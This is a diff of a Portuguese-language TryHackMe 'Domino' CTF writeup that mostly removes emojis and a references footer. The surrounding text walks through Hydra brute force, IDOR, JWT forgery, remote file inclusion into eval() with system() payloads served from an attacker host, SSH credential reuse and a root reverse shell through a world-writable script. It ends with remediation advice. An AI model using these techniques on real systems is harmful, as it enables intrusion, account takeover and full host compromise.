@@ -1,10 +1,10 @@
 # TryHackMe — Domino (Web / CTF Writeup)
 
-> ⚠️ **Disclaimer** — Writeup educacional de um laboratório controlado (TryHackMe). Flags foram substituídas por `<FLAG_N>` e IPs por `<TARGET_IP>` / `<ATTACKER_IP>`. Credenciais e segredos exibidos são específicos da instância do laboratório e não têm valor fora dele. **Não use estas técnicas em sistemas sem autorização explícita.**
+> **Disclaimer** — Writeup educacional de um laboratório controlado (TryHackMe). Flags foram substituídas por `<FLAG_N>` e IPs por `<TARGET_IP>` / `<ATTACKER_IP>`. Credenciais e segredos exibidos são específicos da instância do laboratório e não têm valor fora dele. **Não use estas técnicas em sistemas sem autorização explícita.**
 
 ---
 
-## 📑 Sumário
+## Sumário
 
 - [Visão Geral](#-visão-geral)
 - [Ferramentas](#-ferramentas)
@@ -22,7 +22,7 @@
 
 ---
 
-## 🎯 Visão Geral
+## Visão Geral
 
 **Domino** é um laboratório web que encadeia cinco vulnerabilidades clássicas até o comprometimento total do host. Cada flag abre a porta da próxima, num fluxo típico de pentest web:
 
@@ -38,7 +38,7 @@
 
 ---
 
-## 🧰 Ferramentas
+## Ferramentas
 
 | Ferramenta | Uso |
 |---|---|
@@ -54,7 +54,7 @@
 
 ---
 
-## 🔍 Reconhecimento
+## Reconhecimento
 
 ### Scan de portas
 
@@ -69,7 +69,7 @@ nmap -sV -sC <TARGET_IP>
 80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
 ```
 
-> 📝 **Nota:** Apenas dois serviços expostos. O SSH será útil na fase de privesc lateral (Flag 4).
+> **Nota:** Apenas dois serviços expostos. O SSH será útil na fase de privesc lateral (Flag 4).
 
 ### Análise do site
 
@@ -79,7 +79,7 @@ nmap -sV -sC <TARGET_IP>
 - Forgot password (`forgot.php`)
 - Our team (`team.php`) — lista nomes e e-mails de funcionários
 
-> 📝 **Nota:** Os e-mails seguem o padrão `firstname.lastname@nexus.corp`, o que já nos dá uma lista de potenciais usernames:
+> **Nota:** Os e-mails seguem o padrão `firstname.lastname@nexus.corp`, o que já nos dá uma lista de potenciais usernames:
 
 1. `laura.hayes`
 2. `michael.chen`
@@ -91,7 +91,7 @@ nmap -sV -sC <TARGET_IP>
 
 ---
 
-## 🌐 Enumeração Web
+## Enumeração Web
 
 ### Descoberta de diretórios
 
@@ -133,11 +133,11 @@ team.php             (200)
 | `/support/` | Redireciona para login |
 | `/team.php` | Lista pública de funcionários |
 
-> 📝 **Nota:** Os diretórios `/backup/` e `/static/` são baixáveis — **sempre** baixe e leia arquivos estáticos: costumam ter chaves, endpoints e comentários de deploy.
+> **Nota:** Os diretórios `/backup/` e `/static/` são baixáveis — **sempre** baixe e leia arquivos estáticos: costumam ter chaves, endpoints e comentários de deploy.
 
 ---
 
-## 📂 Análise de Arquivos Estáticos
+## Análise de Arquivos Estáticos
 
 ```bash
 wget http://<TARGET_IP>/backup/README.txt
@@ -165,7 +165,7 @@ const CONFIG = {
 
 > 💡 **Nota:** Chave encontrada em arquivo estático público. A chave que deveria proteger o backup está no front-end, acessível a qualquer visitante.
 
-### 🔓 Descriptografia do `config.enc`
+### Descriptografia do `config.enc`
 
 O `README.txt` indica **AES-128-ECB**. ECB é inseguro porque blocos iguais de plaintext geram blocos iguais de ciphertext — mas aqui o problema nem é o modo, é a **chave exposta**.
 
@@ -196,9 +196,9 @@ print(plaintext.decode())
 
 > 🔎 O campo `system_user: ****` confirma um usuário do sistema chamado `****` — informação crucial para a **Flag 4**.
 
-> 📝 **Nota:** `README`, `*.enc`, `*.bak`, `app.js` e `config.*` são fontes de ouro para credenciais. Sempre enumere `/backup/`, `/static/`, `/js/`, `/assets/` e baixe tudo.
+> **Nota:** `README`, `*.enc`, `*.bak`, `app.js` e `config.*` são fontes de ouro para credenciais. Sempre enumere `/backup/`, `/static/`, `/js/`, `/assets/` e baixe tudo.
 
-### 💥 Brute-force de login
+### Brute-force de login
 
 Com toda a informação coletada, foi feito brute-force de login com **Hydra**, usando a lista de usuários encontrada e o `rockyou.txt`:
 
@@ -219,11 +219,11 @@ hydra -L users -P rockyou.txt -s 80 <TARGET_IP> \
 | `emma.taylor` | `********` |
 | `sarah.johnson` | `********` |
 
-> ⚠️ **Observação:** Três contas com a **mesma senha** — sinal de política fraca.
+> **Observação:** Três contas com a **mesma senha** — sinal de política fraca.
 
 ---
 
-## 🚩 Flag 1 — IDOR
+## Flag 1 — IDOR
 
 ### Login e descoberta de endpoint
 
@@ -239,7 +239,7 @@ Em **My Profile**, foi identificado o endpoint:
 /api/users/profile.php?id=4
 ```
 
-> 📝 Após identificar esse endpoint, foram testados os valores do parâmetro `id` de `1` a `7` — correspondentes aos 7 usuários — via `curl`, para verificar IDOR.
+> Após identificar esse endpoint, foram testados os valores do parâmetro `id` de `1` a `7` — correspondentes aos 7 usuários — via `curl`, para verificar IDOR.
 
 ```bash
 curl -s "http://<TARGET_IP>/api/users/profile.php?id=1" \
@@ -258,11 +258,11 @@ curl -s "http://<TARGET_IP>/api/users/profile.php?id=1" \
 }
 ```
 
-> ✅ **Observação:** Vulnerabilidade **IDOR** confirmada. A Flag 1 foi obtida ao manipular o `id` para `1` (conta do admin `laura.hayes`). O controle de acesso não valida se o usuário autenticado tem permissão para acessar o recurso solicitado.
+> **Observação:** Vulnerabilidade **IDOR** confirmada. A Flag 1 foi obtida ao manipular o `id` para `1` (conta do admin `laura.hayes`). O controle de acesso não valida se o usuário autenticado tem permissão para acessar o recurso solicitado.
 
 ---
 
-## 🔑 Flag 2 — JWT Forgery
+## Flag 2 — JWT Forgery
 
 ### Obter um token válido
 
@@ -331,7 +331,7 @@ print(f"{header}.{payload}.fakesignature")
 curl -i http://<TARGET_IP>/admin/ -H "Authorization: Bearer <ADMIN_JWT>"
 ```
 
-> ✅ **Observação:** O painel admin responde **200** — Flag 2 confirmada pelo acesso. A página exibe:
+> **Observação:** O painel admin responde **200** — Flag 2 confirmada pelo acesso. A página exibe:
 
 ```text
 File System Access
@@ -339,13 +339,13 @@ Internal document viewer via authenticated API.
 GET /api/files.php?name=[path] with Bearer token
 ```
 
-> 💡 JWTs são **stateless** — se o servidor não valida a assinatura (HS256 com segredo fraco, `alg: none`, ou sem verificação), o payload pode ser editado livremente. Sempre teste alterar `role`, `sub` e `user_id`.
+> JWTs são **stateless** — se o servidor não valida a assinatura (HS256 com segredo fraco, `alg: none`, ou sem verificação), o payload pode ser editado livremente. Sempre teste alterar `role`, `sub` e `user_id`.
 
 ---
 
-## 💣 Flag 3 — RFI + `eval()` → RCE
+## Flag 3 — RFI + `eval()` → RCE
 
-> 📝 Utilizando o endpoint `/api/files.php?name=` com o JWT falsificado do admin, tentou-se ler `/etc/passwd`. A requisição foi bloqueada pela validação de caminho (`realpath()`), que restringe o acesso a `/var/www/html/`.
+> Utilizando o endpoint `/api/files.php?name=` com o JWT falsificado do admin, tentou-se ler `/etc/passwd`. A requisição foi bloqueada pela validação de caminho (`realpath()`), que restringe o acesso a `/var/www/html/`.
 
 ```bash
 curl -i "http://<TARGET_IP>/api/files.php?name=../../etc/passwd" \
@@ -410,7 +410,7 @@ echo 'system("id; ls -la /opt; cat /opt/flag3.txt");' > payload.txt
 
 **Servir na máquina local:**
 
-> ⚠️ O servidor HTTP deve ser iniciado **no diretório onde o payload foi criado**, para que o arquivo seja servido corretamente ao alvo.
+> O servidor HTTP deve ser iniciado **no diretório onde o payload foi criado**, para que o arquivo seja servido corretamente ao alvo.
 
 ```bash
 python3 -m http.server 8000
@@ -436,13 +436,13 @@ drwxr-xr-x  2 root     root     4096 tools
 <FLAG_3>
 ```
 
-> 📝 **Nota:** Sempre que encontrar um arquivo, tente lê-lo. Aqui o `admin_bot.py` é `777` (world-writable) e roda como root (veremos adiante); além disso, há um diretório `monitoring`.
+> **Nota:** Sempre que encontrar um arquivo, tente lê-lo. Aqui o `admin_bot.py` é `777` (world-writable) e roda como root (veremos adiante); além disso, há um diretório `monitoring`.
 
 ---
 
-## 🔀 Flag 4 — Reuso de Credencial → SSH
+## Flag 4 — Reuso de Credencial → SSH
 
-> 📝 Para ler a Flag 4, a mesma técnica da Flag 3 foi tentada, mas a leitura foi bloqueada por permissão (`Permission denied`).
+> Para ler a Flag 4, a mesma técnica da Flag 3 foi tentada, mas a leitura foi bloqueada por permissão (`Permission denied`).
 
 **Payload:**
 
@@ -456,7 +456,7 @@ echo 'system("cat /home/devops/flag4.txt 2>&1");' > payload.txt
 cat: /home/devops/flag4.txt: Permission denied
 ```
 
-> 📝 O home do `devops` tem permissão `750` e a flag tem permissão `600` — ou seja, `www-data` não tem permissão de leitura. É necessária uma **escalada de privilégios**.
+> O home do `devops` tem permissão `750` e a flag tem permissão `600` — ou seja, `www-data` não tem permissão de leitura. É necessária uma **escalada de privilégios**.
 
 ### Lendo `admin_bot.py`
 
@@ -476,7 +476,7 @@ DB_CONFIG = dict(host="localhost", database="nexusdb",
 APP_SECRET = "******************"
 ```
 
-> 💡 A senha `********` é literalmente `******`. O `system_user: *****` (do `config.enc`) já tinha aparecido. **Hipótese:** a senha do banco é a mesma do usuário do sistema.
+> A senha `********` é literalmente `******`. O `system_user: *****` (do `config.enc`) já tinha aparecido. **Hipótese:** a senha do banco é a mesma do usuário do sistema.
 
 ### Tentativa via `su` — falha
 
@@ -487,7 +487,7 @@ echo '***********' | script -q -c "su devops -c 'cat /home/devops/flag4.txt'" /d
 # → su: Authentication failure  (por race condition, não por senha errada)
 ```
 
-### ✅ Solução — SSH direto
+### Solução — SSH direto
 
 ```bash
 ssh devops@<TARGET_IP>
@@ -501,7 +501,7 @@ cat /home/devops/flag4.txt
 
 ---
 
-## 👑 Flag 5 — Script World-Writable → Root
+## Flag 5 — Script World-Writable → Root
 
 ### Enumeração como `devops`
 
@@ -527,7 +527,7 @@ ls -la /opt/monitoring/health_report.sh
 # -rwxrwxr-- 1 root devops 537 May 18 10:41 health_report.sh
 ```
 
-### ❌ Tentativa 1 — `cp` da flag (falhou)
+### Tentativa 1 — `cp` da flag (falhou)
 
 ```bash
 cat > /opt/monitoring/health_report.sh <<'EOF'
@@ -537,7 +537,7 @@ chmod 644 /tmp/flag5 2>/dev/null
 EOF
 ```
 
-### ✅ Tentativa 2 — Reverse shell (funcionou)
+### Tentativa 2 — Reverse shell (funcionou)
 
 **Listener:**
 
@@ -563,7 +563,7 @@ cat /root/root.txt
 
 ---
 
-## 📚 Lições Aprendidas
+## Lições Aprendidas
 
 - **IDOR** é trivial de explorar quando o backend confia cegamente no parâmetro `id`.
 - **JWT** sem validação de assinatura = qualquer um vira admin.
@@ -574,7 +574,7 @@ cat /root/root.txt
 
 ---
 
-## 🛡️ Remediação
+## Remediação
 
 | Vulnerabilidade | Correção |
 |---|---|
@@ -585,20 +585,3 @@ cat /root/root.txt
 | Script world-writable | Permissões `750`/`700`; validar integridade; rodar como usuário dedicado |
 
 ---
-
-## 🔗 Referências
-
-- [TryHackMe — Domino](https://tryhackme.com/)
-- [OWASP — IDOR](https://owasp.org/www-project-top-ten/)
-- [PortSwigger — JWT Attacks](https://portswigger.net/web-security/jwt)
-- [PHP `eval()` — Manual](https://www.php.net/manual/en/function.eval.php)
-
----
-
-<div align="center">
-
-**✅ Fim do writeup — Obrigado por ler!**
-
-*Se este material ajudou, deixe uma ⭐ no repositório.*
-
-</div>
